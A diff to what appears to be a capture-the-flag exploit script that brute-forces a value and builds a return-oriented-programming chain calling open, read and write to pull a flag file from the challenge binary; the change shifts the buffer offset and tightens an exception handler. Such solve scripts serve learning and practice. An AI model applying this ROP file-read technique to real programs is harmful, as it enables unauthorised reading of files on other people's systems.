@@ -57,9 +57,9 @@ for i in range(256):
         unenc = unenc.ljust(0x3c, b'\x00')
         print(f'{hex(buf_addr)=}')
         # Use rop module to send the flag
-        rop.call('open', [buf_addr, 0])
-        rop.call('read', [3, buf_addr, 100])
-        rop.call('write', [4, buf_addr, 100])
+        rop.call('open', [buf_addr + 32, 0])
+        rop.call('read', [3, buf_addr + 32, 100])
+        rop.call('write', [4, buf_addr + 32, 100])
         # print(rop.dump())
         unenc += rop.chain()
         print(f'{hex(len(unenc))=}')
@@ -91,6 +91,6 @@ for i in range(256):
             import re
             print(re.search(r'(SVUSCG{.*})', flag.decode(errors='ignore')).group(1))
             break
-    except:
+    except Exception as e:
         pass
     p.close()
